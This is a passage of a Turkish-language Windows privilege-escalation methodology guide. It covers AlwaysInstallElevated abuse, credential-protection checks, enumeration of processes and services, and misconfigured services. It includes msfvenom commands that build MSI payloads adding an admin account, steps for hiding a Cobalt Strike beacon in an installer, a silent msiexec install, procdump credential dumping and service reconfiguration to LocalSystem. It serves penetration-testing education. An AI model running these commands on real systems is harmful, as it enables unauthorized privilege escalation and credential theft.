[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 registry anahtarı **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Mevcut dizinde yetki yükseltmek için bir Windows MSI binary'si oluşturmak üzere power-up'ın `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacak):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu eğitimi okuyun. Yalnızca **komut satırlarını çalıştırmak** istiyorsanız bir "**.bat**" dosyasını wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- 4 adımdan 3.'süne (include edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayıp az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini vurgulayın ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - **Author** ve **Manufacturer** gibi değiştirebileceğiniz başka özellikler de vardır. Bunlar, yüklenen uygulamanın daha meşru görünmesini sağlayabilir.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece installer çalıştırılır çalıştırılmaz Beacon payload'ı çalıştırılır.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build edin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının **kurulumunu** arka planda çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu zafiyeti exploit etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar nelerin **loglandığını** belirler, bu yüzden dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding ile logların nereye gönderildiğini öğrenmek faydalı olabilir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, domain'e katılmış bilgisayarlardaki **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izinler verilmiş kullanıcılar tarafından erişilebilir; bu sayede yetkili kullanıcılar yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hale getirmek için güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla Local Security Authority (LSA) için gelişmiş koruma sunmuştur.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunuldu. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Yerel Güvenlik Yetkilisi** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilgi çekici izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalık yükseltmek için bunlardan nasıl yararlanabileceğiniz hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

Bu sayfada **token** kavramı hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
İlginç **token'lar** ve bunlardan nasıl yararlanabileceğiniz hakkında bilgi edinmek için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Kullanıcı klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panonun içeriğini al

```bash
powershell -command "Get-Clipboard"
```

## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle, süreçleri listelerken **sürecin komut satırında parola olup olmadığını kontrol edin**.\
**Çalışan bir binary'nin üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) gerçekleştirmek için binary klasöründe yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debugger'larını** kontrol edin; bunları yetki yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Bir debugger listener'ı kısa süreliğine açık olabilir; bu nedenle tek bir pasif port taramasında görünmemesi, hiçbir zaman açığa çıkmadığını kanıtlamaz. Gözlemlenen listener'ları PID, process sahibi ve düşük yetkili kullanıcının bu listener'lara erişip erişemediğiyle ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arası code execution olduğunu göstermez. Rutin enumeration işlemlerini debugger komutları göndermek yerine pasif tutun.

**Process binary dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreçlerin ikili dosyalarının bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada belirtilen `dynamicpreprocessor directory` konumundan paylaşımlı kitaplıklar yükleyebilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış görev veya hizmet için tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız burada dosya oluşturabiliyorsa bu yol, görev veya hizmet modülleri bir sonraki yüklediğinde code execution açısından incelenmeye adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm deny ya da paylaşım kısıtlamalarını doğrulayın; yalnızca dizinin yazılabilir olması privilege escalation olduğunu kanıtlamaz. [Snort'un dynamic preprocessor belgeleri](https://www.snort.org/documents/dpx-readme) runtime module loading konusunu açıklar.

### Yazılabilir document root'a sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda, hizmetin çalıştırılabilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Geleneksel bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış document root'un ACL'sini (genellikle `C:\xampp\htdocs`) inceleyin. Apache `LocalSystem` olarak çalışırken daha düşük ayrıcalıklı bir kullanıcı bu kök dizinde dosya oluşturabiliyorsa, server-side code execution ana bilgisayarın ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak bu yolun sunulduğunu ve server-side bir handler'ın dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir kök dizin yalnızca dosya oluşturulabildiğini kanıtlar. ACL'leri bir deneme dosyası yazmadan inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümlendirilmiş bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32 bitlik düzende `C:\wamp\...`) işaret edebilir; yapılandırma dosyası da yanındaki `conf\httpd.conf` altında, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Hizmetin tam image değerini, hangi kullanıcı kimliğiyle çalıştığını, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dahil) ve kök dizinin ACL’sini birlikte kontrol edin. WAMP dizininin yazılabilir olması, Apache’nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı yürüttüğünü kanıtlamaz. [Apache, Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve uygulama havuzunun ağ kimliği

IIS’te, yazılabilir fiziksel dizini `applicationHost.config` içindeki **etkin bir site/uygulamayla** eşleştirin, ardından yapılandırılmış havuzu ve sunucu tarafı handler’ı belirleyin. Sunulan dizine yerleştirilen kod, ancak IIS bu dosya türünü işler ve ilgili rotaya erişilebilirse havuz kimliğiyle çalışır. Yazılabilir bir dizini code execution olarak değerlendirmeden önce mevcut kullanıcının dosya oluşturma erişimini, sitenin çalışma durumunu, handler’ı ve yola özgü geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol sunar: uygulamanın derleme dizini altında oluşturulan dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft, konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak kodu değiştirebiliyorsa, uygulamanın bunu daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL’si code execution kanıtı değildir: önbelleği etkin uygulamayla, etkin token ve ACL’yle, derleme ayarlarıyla, işlem kimliğiyle ve yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur metadata incelemesi yapın; envanter çıkarırken derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token’ı düşük ayrıcalıklı olsa bile genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerel olarak zaten yüksek ayrıcalıklıdır ve ağda yine bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu kendi yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini belgeliyor](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklıyor](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Kimlik ayarı belirtilmemişse havuz varsayılanları devralınabilir; bu varsayılanlar IIS sürümleri arasında farklılık gösterir, bu nedenle havuz adına bakarak tahmin yürütmek yerine etkin yapılandırmayı çözümleyin. Code execution bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **ilgili bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu hakların varlığını kanıtlamaz. Pasif envanter çıkarma sırasında dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırmayı ve ACL’leri inceleyin.

Yardımcı bir işlem başlatan ve okunabilir olan bir ASP.NET handler için, istekten türetilen değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma adımlarından geçerken izleyin. Çözümlenmiş bir token’ı `ProcessStartInfo("cmd", "/c ...")` içine ekleyen bir handler, shell metakarakterlerinin komutu değiştirmesine yol açabilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın çözümlenmiş değeri gerçekten etkileyebildiğini ve handler’a erişebildiğini doğrulayın; ardından etkin uygulama havuzunun veya taklit edilen kullanıcının kimliğini ve alt işlemin kimliğini belirleyin. Okunabilir bir kaynak kod satırı, localhost listener’ı veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütmeyi kanıtlamaz. Pasif envanter çıkarırken sahte istekler göndermeden veya yardımcı işlemi çalıştırmadan kaynak kodu ve havuz yapılandırmasını inceleyin.

Windows’ta çalışan bir PHP hizmetinde, istek tarafından denetlenen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) içine aktarılan bir yol, daha düşük ayrıcalıklı kullanıcının yazabildiği bir PHP dosyasını worker kimliği altında değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük ayrıcalıklı kullanıcının değiştirebildiği ve worker’ın okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker’ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Loopback listener’ı veya yazılabilir dosya tek başına bu zinciri kanıtlamaz; pasif envanter çıkarırken endpoint’i çağırmadan kaynak kodu, hizmet kimliğini ve dosya ACL’lerini inceleyin.

### Bellekten parola çıkarma

**Sysinternals**’tan **procdump** kullanarak çalışan bir işlemin memory dump’ını oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte açık metin olarak bulunabilir**; belleği dump edip kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, ardından "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük yetkili bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan süreci veya görevi, etkin kimliğini ve ayrıştırıcı sürümünü inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML harici varlıklarına izin veriyordu; Windows'ta bir ağ varlığı, [giden SMB ve NTLM ilkeleri](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktaran hesabın kimlik doğrulaması yapmasına neden olabilirdi. Bu, kimlik bilgilerinin açığa çıkabileceğine dair bir ipucudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı ve yetkili veya savunmasız bir yol üzerinden kullanılabilmesi gerekir ve güncel sürümler gerçek yama durumlarına göre değerlendirilmelidir. Pasif envanter sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için başarılı, salt okunur bir [`OpenSCManager` erişim isteği](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw), incelemeye değer bir ipucudur; yeni bir hizmetin çalıştırılabileceğinin kanıtı değildir. [`CreateService` bir tanıtıcı döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu tanıtıcının erişim hakları, oluşturma sırasında istenen hizmet erişimini içerir. Hizmet daha sonra yeniden açıldığında ayrı bir erişim denetimi yapılır ve ilk tanıtıcı kullanılabilir olsa bile bu işlem başarısız olabilir. Etkin yerel veya uzak belirteci, tanıtıcıya verilen hakları, hizmet hesabını, başlatma ilkesini ve yürütülebilir dosya yolunu ayrı ayrı doğrulayın. Pasif envanter sırasında hizmet oluşturmayın veya başlatmayın.

Uzak hizmet kurulum yolu için, söz konusu SCM haklarını hedefteki aynı ağ oturum açma işleminin yazabildiği bir paylaşımla, paylaşımın temelindeki NTFS ACL'siyle ve hizmet hesabının çalıştırabileceği yerel bir yürütülebilir dosya yoluyla ilişkilendirin. Alışılmadık ölçüde geniş SCM haklarıyla dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Yalnızca paylaşıma yazma erişimi veya yalnızca SCM hizmet oluşturma ipucu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini göstermez.

Mevcut bir hizmet, `ImagePath` içinde bulunmasa bile başlangıç, kapanış veya başka bir yaşam döngüsü olayı sırasında bir yardımcı yürütülebilir dosyayı çağırabilir. Yardımcı dosyanın adı, daha düşük yetkili bir kullanıcının yazabildiği bir dizinde çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen yürütülebilir dosya yolunu ve arama sırasını, dizin oluşturma izinlerini, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yüklediğini göstermez; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` işlevine bağımsız değişken sağlamaya izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından farklıdır. Başlatma erişimini yalnızca bir denetim hakkı olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın belirlediği bir bağımsız değişkeni günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, bağımsız değişkenin yazma işlemine nasıl aktarıldığını, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korunan bir dizine yazma işlemi ancak dosyayı kabul eden ayrı bir ayrıcalıklı tüketici veya yükleyici varsa ayrıcalık yükseltmeye dönüşebilir; tek başına yazılabilir bir günlük veya başlatma hakkı yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, **yapılandırma incelemesi için bir ipucudur**: dosyada web kimlik bilgileri bulunabilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya betikleri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı yürütme için ek olarak `CheckExternalScripts` (veya etkin başka bir yürütme yolu), bir komutu kaydetmek ya da değiştirmek için geçerli bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca geri döngü arabirimini dinleyen bir dinleyiciye yerel kullanıcı yine de erişebilir; ancak dosya yolu, parola veya dinleyici tek başına bu hakların varlığını göstermez. Pasif envanter sırasında sırları görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya yerleşimi](https://nsclient.org/docs/concepts/file-layout/), [web ve betik güvenliği yönergeleri](https://nsclient.org/docs/setup/securing/) ve [harici betik yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmette, hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM alt uygulamayı burada depolar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Sarmalayıcının izinlerini hizmet sınırının tamamı olarak değerlendirmeden önce alt yürütülebilir dosyanın ve üst dizinlerinin ACL'lerini kontrol edin. Bu alt uygulamanın sunduğu yerel bir WCF veya SOAP uç noktası, inceleme için ayrı bir ipucudur: düşük yetkili kullanıcının dinleyiciye erişebildiğini, ilgili işlemin bu kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, uç nokta URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif envanter sırasında hizmet işlemlerini çağırmaktan kaçının.

Özel bir WCF işleminde, çağıranın denetlediği bir dizgenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript`, betik metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke`, işlem hattını çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows taşıma kimlik bilgilerini kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** bir işlemi çağırma yetkisiyle runspace'in etkin kimliği ayrıca denetlenmelidir. Düşük yetkili bir çağıranın girdisinin, daha yüksek bir hizmet kimliği altında `AddScript` işlevine ulaşması bir kod yürütme sınırıdır; yalnızca dinleyen bir bağlantı noktası, kimliği doğrulanmış bir istemci veya ilgisiz bir derlemedeki kullanılmayan bir yöntem kanıt değildir. Envanter sırasında uç noktayı çağırmadan dağıtılmış hizmeti, sözleşmeyi, yetkilendirmeyi ve kimliğe bürünme ayarlarını statik olarak inceleyin.

Hizmet Tetikleyicileri, belirli koşullar oluştuğunda (adlandırılmış kanal/RPC uç noktası etkinliği, ETW olayları, IP kullanılabilirliği, aygıtın bağlanması, GPO yenilemesi vb.) Windows'un bir hizmeti başlatmasını sağlar. SERVICE_START hakkınız olmasa bile tetikleyicilerini çalıştırarak ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Numaralandırma ve etkinleştirme tekniklerini burada görebilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcısı hizmeti

C/C++ araçları içeren Visual Studio kurulumlarında, `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmetin DACL sıfırlama işlemini yönlendirmek için bir junction ve object-manager-link yarış durumu kullandı. Gösterilen ayrıcalık yükseltme, kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve bu yoldaki `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini de gerektiriyordu. Bileşendeki güvenlik açığı Ocak 2024'te giderildi.

Pasif ilk inceleme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir hizmet kaydı, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana makinenin savunmasız olduğunu göstermez. İnceleme için hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_ tarafından sunulan **accesschk** ikilisine sahip olmanız önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya kendisiyle ilişkili etkin bir cihaz yok._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

